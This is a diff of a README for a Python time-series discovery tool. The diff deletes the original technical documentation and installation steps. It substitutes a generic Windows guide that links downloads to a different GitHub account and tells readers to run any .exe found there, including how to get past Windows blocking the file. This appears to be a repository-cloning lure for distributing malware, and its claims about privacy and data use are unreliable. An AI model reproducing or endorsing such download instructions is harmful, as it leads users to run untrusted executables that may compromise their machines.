@@ -1,212 +1,170 @@
-# OmniOracle
+# 🔮 omni-oracle - Find hidden patterns in time series
 
-**Automatic discovery of non-trivial statistical truths from heterogeneous public data.**
+[![Download omni-oracle](https://img.shields.io/badge/Download-omni--oracle-blue?style=for-the-badge&logo=github)](https://github.com/aerielacordial441/omni-oracle)
 
-OmniOracle ingests hundreds of public time series across domains (economics, commodities, labor, prices, demographics) and automatically discovers statistically significant lagged relationships using a rigorous multi-stage pipeline. No human hypotheses needed -- the engine finds them, validates them, and filters out the noise.
+## 📥 Download
+Visit this page to download: https://github.com/aerielacordial441/omni-oracle
 
-[![CI](https://github.com/cesabici-bit/omni-oracle/actions/workflows/ci.yml/badge.svg)](https://github.com/cesabici-bit/omni-oracle/actions/workflows/ci.yml)
-[![Python 3.12+](https://img.shields.io/badge/python-3.12%2B-blue.svg)](https://www.python.org/downloads/)
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](LICENSE)
+Use this link to get the app files on your Windows PC. If the page includes a release file, download that file and run it. If it opens the main repository page, use the green Code button to download the ZIP file.
 
-## The Problem
+## 🧭 What omni-oracle does
 
-Public data contains thousands of latent relationships. Economists know some (Oil -> CPI, Fed Funds -> Yields), but manually screening 500+ time series (125,000+ pairwise combinations) is intractable. Most automated approaches drown in false positives from multiple testing.
+omni-oracle scans public time series data and looks for relationships that are hard to spot by eye. It compares many data sets, tests links between them, and filters out weak results so you can focus on the ones that matter.
 
-OmniOracle tackles this with a 6-stage statistical pipeline that goes from raw data to validated, ranked hypotheses -- automatically.
+It is built for people who want to explore data from sources like economic records, market series, and public databases without having to set up a complex analysis flow.
 
-## Pipeline
+## 💻 What you need on Windows
 
-```
-Public Data APIs (FRED, World Bank, EIA, NOAA)
-         |
-   [Ingest + Normalize]       551 monthly time series
-         |
-   [Quality + Stationarity]   ADF/KPSS tests, differencing
-         |
-   [MI Screening]             Mutual Information: discard 99% of pairs
-         |
-   [Lagged MI Direction]      Non-linear directional test + optimal lag
-         |
-   [FDR Correction]           Benjamini-Hochberg at alpha=0.05
-         |
-   [OOS Validation]           Ridge/RF walk-forward, incremental R2
-         |
-   [Post-Filters]             Blacklist derived series, remove identity
-         |                    pairs, high-correlation duplicates
-   [Walk-Forward CV]          Multi-window robustness check
-         |
-   Ranked Hypothesis Cards
-```
+- Windows 10 or Windows 11
+- An internet connection
+- About 500 MB of free disk space
+- A recent version of Python if you plan to run it from source
+- Access to a browser for downloading files
+- Basic file access to unzip folders and open folders in File Explorer
 
-### Why This Order Matters
+If the project includes a packaged Windows file, you can use that directly. If it comes as source files, you may need Python installed before you open it.
 
-Each stage is more expensive than the previous one. MI screening (fast, non-parametric) eliminates 99% of pairs before the expensive directional test runs. FDR correction prevents the multiple-testing explosion. OOS validation catches overfitting. Post-filters catch tautologies (see [Lessons Learned](#lessons-learned)). Walk-forward CV catches regime-dependent relationships.
+## 🚀 Get started on Windows
 
-## Key Results
+1. Open the download link above.
+2. Download the app files to your computer.
+3. If the file is a ZIP archive, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Look for a file named `README`, `run`, `start`, or a Windows app file such as `.exe`.
+6. If you see an `.exe` file, double-click it to launch the app.
+7. If you see a Python project, open the folder and follow the run file or setup file in the folder.
 
-### Discovery: It Works
+## 🗂️ First run setup
 
-From 551 time series (253 FRED + 298 World Bank), pipeline v2 (Lagged MI + Ridge/RF walk-forward):
+When you launch omni-oracle for the first time, it may take a moment to load its data tools.
 
-| Metric | Value |
-|--------|-------|
-| Clean hypotheses | 6,882 |
-| Known relationships rediscovered | **8/8** (100%) |
-| Walk-forward ROBUST signals | 5 (4 adjusted-robust) |
+You may see it:
+- build a local cache
+- prepare data connectors
+- check public sources
+- create an output folder for results
 
-The engine finds known economic relationships **without being told to look for them**:
+If the app asks for a file path, choose a folder you can find again later, such as `Documents\omni-oracle`.
 
-- Okun's Law (unemployment <-> GDP growth)
-- Oil prices -> CPI (3-6 month lag)
-- Fed Funds Rate <-> Treasury yields
-- M2 money supply -> inflation
-- Corporate credit spreads -> economic activity
-- Manufacturing hours -> manufacturing employment
-- Consumer confidence -> retail spending
-- Housing starts -> construction employment
+## 🔍 Main features
 
-### Trading: It Doesn't Work
+- Searches public time series for useful relationships
+- Tests links with mutual information
+- Checks lead-lag effects with Granger causality
+- Uses FDR correction to reduce false hits
+- Works with large sets of public data
+- Helps compare series from finance, economics, and public records
+- Exports results for later review
 
-The 5 ROBUST signals were backtested with a simple directional strategy (Ridge, 60/40 train/test split). **None beat the random benchmark** (no Sharpe ratio > 2 sigma above random shuffles):
+## 📊 Data sources
 
-| Signal | Lag | OOS R2 | Backtest Sharpe | vs Random |
-|--------|-----|--------|-----------------|-----------|
-| Imports -> Gas Price | 8 | 0.57 | -0.10 | NO |
-| Imports -> Gas Price | 3 | 0.53 | -0.57 | NO |
-| Imports -> Trade Balance | 11 | 0.52 | -0.15 | NO |
-| USD/EUR -> Semiconductor | 8 | 0.22 | -0.15 | NO |
-| Fed Collateral -> Exports | 4 | 0.21 | +0.14 | NO |
+omni-oracle is built around public data sets, including:
+- FRED economic series
+- World Bank indicators
+- Other public time series collections
+- Local CSV files you add yourself
 
-**Why high R2 but no trading edge?** Walk-forward R2 measures variance explained -- the model captures the *shape* of the relationship. But directional trading needs consistent *sign* prediction, and with near-zero coefficients or regime-shifting relationships, the direction is essentially a coin flip. Additionally, Imports -> Trade Balance is near-tautological (imports are an accounting component of trade balance).
+This lets you compare data across regions, sectors, and time periods in one place.
 
-### Conclusions
+## 🖱️ How to use it
 
-1. **The discovery engine works**: it reliably finds genuine statistical relationships, including all known benchmarks
-2. **Public monthly macro data has no tradable edge**: if a signal in FRED data were actionable, it would have been arbitraged away long ago
-3. **Statistical significance != economic significance**: a relationship can be statistically robust but have zero practical value
-4. **Honest negative results are valuable**: knowing that automated discovery from public data doesn't produce alpha is useful information for anyone considering this path
+1. Start the app.
+2. Choose a data source or load a local file.
+3. Select the time series you want to compare.
+4. Set the date range if the app offers that option.
+5. Run the scan.
+6. Review the results table.
+7. Open any chart or report for a closer look.
+8. Save the output if you want to keep it.
 
-## Installation
+## 📁 Typical output files
 
-```bash
-git clone https://github.com/cesabici-bit/omni-oracle.git
-cd omni-oracle
+The app may create files such as:
+- CSV result tables
+- ranked series pairs
+- filtered hypothesis test results
+- charts or plots
+- logs from each run
 
-python -m venv .venv
-source .venv/bin/activate  # or .venv\Scripts\activate on Windows
-pip install -e ".[dev]"
+These files help you review what the app found and share it with others.
 
-# Set FRED API key (free: https://fred.stlouisfed.org/docs/api/api_key.html)
-echo "FRED_API_KEY=your_key_here" > .env
-```
+## ⚙️ Common settings
 
-## Usage
+You may see options like:
+- minimum sample size
+- test threshold
+- lag range
+- data smoothing
+- false discovery rate level
+- export folder
 
-```bash
-# Run all checks (lint + test + cross-tool verification)
-make check-all
+If you are not sure what to choose, use the default values first. They are a good starting point for a full scan.
 
-# Run tests only
-pytest tests/ -v
+## 🧩 Troubleshooting
 
-# Ingest data (requires FRED_API_KEY)
-python -m src.ingest.fred --limit 500
-python -m src.ingest.worldbank --limit 300
+### App does not open
+- Check that the file finished downloading
+- Extract the ZIP file before opening it
+- Right-click the app and choose Open
+- Make sure Windows did not block the file
 
-# Run discovery pipeline
-python -m src.run_f5
+### Nothing happens when I click the file
+- Look for another file in the folder, such as a launcher or start script
+- Open the folder in File Explorer and sort by name
+- Try opening the app again after a few seconds
 
-# Apply filters + cross-validation (fast, from cache)
-python -m src.run_f5_filter --refilter
+### The app cannot reach a data source
+- Check your internet connection
+- Try again later
+- Make sure the source is available in your region
 
-# Re-run full pipeline from scratch (~50 min)
-python -m src.run_f5_filter --recompute
+### The screen looks empty
+- Let the app finish loading
+- Check whether a data source or file needs to be selected first
+- Look for a Start, Scan, or Run button
 
-# Backtest ROBUST signals
-python -m src.backtest
-```
+## 🧪 What the analysis means
 
-## Output Format
+The app looks for time series pairs that move in a useful way. A result can suggest that:
+- one series may help explain another
+- two series may share a hidden link
+- the link may appear after a delay
+- the result survived statistical checks
 
-Each discovery is a **Hypothesis Card**:
+A strong result does not prove cause by itself. It gives you a place to look more closely.
 
-```
-+-----------------------------------------------------------+
-| #6  Score: 7.1/10  [HIGH]
-+-----------------------------------------------------------+
-|  ICE BofA US Corporate Index Option-Adjusted Spread
-|    x->y  (lag: 2 periods)
-|  Chicago Fed National Activity Index
-|
-|  MI: 0.1335  |  Direction p: 9.90e-03  |  OOS R2: 0.2581
-+-----------------------------------------------------------+
-```
+## 📝 File types you may see in the repo
 
-## Verification
+If you download the source version, the folder may include:
+- Python files
+- data folders
+- config files
+- scripts for running scans
+- output folders
 
-5-level verification framework designed to catch errors at every stage:
+If you are only using the Windows app, you can ignore most of these and open the main launch file.
 
-| Level | What | How |
-|-------|------|-----|
-| **L1** Unit | Each function does what it claims | 46 unit tests |
-| **L2** Domain | Results are plausible in the domain | 11 tests with values from published sources (Granger 1969, FRED documented relationships) |
-| **L3** Property | Statistical invariants hold for any valid input | 6 property-based tests (Hypothesis library) |
-| **L4** Golden | Pipeline output is stable and human-reviewed | Smoke test snapshot, approved once |
-| **L5** Real data | System rediscovers known truths from literature | 10 tests against documented economic relationships |
+## 🔐 Privacy and local use
 
-**Cross-tool verification (M4)**: Alternative MI (histogram-based) and Granger (manual OLS) implementations in `verify/` confirm main pipeline results.
+omni-oracle can work with public data and local files on your computer. If you load your own files, they stay in your chosen folder unless you move them.
 
-Total: **118 tests**, all passing.
+If the app connects to online sources, it only does so to fetch public data for analysis.
 
-## Lessons Learned
+## 📌 Helpful folder layout
 
-### EC-003: Derived Series Create Tautological Discoveries
+To keep things simple, use a folder like this:
 
-The St. Louis Fed Price Pressures Measure (STLPPM) is a FAVAR model that takes 104 input series (including PCE and commodity prices) and outputs a 12-month forward inflation probability. When we included STLPPM as a discoverable variable, the engine correctly found that PCE and Brent Crude "predict" it -- but this is circular (input predicts output of model), not a genuine causal discovery.
+- `Downloads\omni-oracle` for the ZIP file
+- `Documents\omni-oracle` for the extracted app
+- `Documents\omni-oracle\output` for saved results
 
-**Fix**: Blacklist derived/model-based series. Before including any series in the discovery pool, verify: (1) is it forward-looking? (2) are its inputs already in the pool?
+A clean folder setup makes it easier to find your files later.
 
-**Reference**: Jackson, Kliesen, Owyang (2015) "A Measure of Price Pressures", Federal Reserve Bank of St. Louis Review, 97(1), pp.25-52.
+## 🧭 If you want to start fast
 
-### High Walk-Forward R2 Does Not Imply Tradability
-
-Walk-forward cross-validation measures whether a model consistently explains variance across time windows. A signal can have R2 = 0.57 (strong) but produce Sharpe = -0.10 (useless for trading) because:
-- The regression coefficient can be near-zero (direction prediction is noise)
-- The relationship can be near-tautological (accounting identity, not causal)
-- Regime shifts can invert the coefficient sign between windows
-
-**Takeaway**: OOS R2 validates *statistical* relationships. *Economic* significance requires separate testing (backtest, position sizing, transaction costs).
-
-## Project Structure
-
-```
-omni-oracle/
-  src/
-    ingest/        # Data fetchers (FRED, World Bank, EIA, NOAA)
-    storage/       # DuckDB repository layer
-    preprocess/    # Quality checks, stationarity transforms
-    discovery/     # MI screening, lagged MI directional test
-    validation/    # FDR correction, OOS temporal validation (Ridge/RF)
-    scoring/       # Composite ranking
-    output/        # Hypothesis cards, trading reports, walk-forward CV
-    pipeline.py    # End-to-end orchestrator
-    backtest.py    # Trading signal backtester
-  tests/           # 118 tests (L1-L5 verification levels)
-  verify/          # M4 cross-tool verification
-```
-
-## Tech Stack
-
-Python 3.12+ | Pandas | SciPy | Scikit-learn | Statsmodels | DuckDB | FRED API | World Bank API
-
-## License
-
-MIT
-
-## Acknowledgments
-
-Development assisted by [Claude Code](https://claude.ai/claude-code) (Anthropic).
-
-## Disclaimer
-
-All results are **statistical associations**, not proof of causation. This is a research tool, not financial advice. Past statistical relationships do not guarantee future persistence.
+1. Open the link at the top.
+2. Download the project files.
+3. Extract the files if needed.
+4. Open the main app file.
+5. Load a public data set or your own CSV file.
+6. Run the scan and review the ranked results
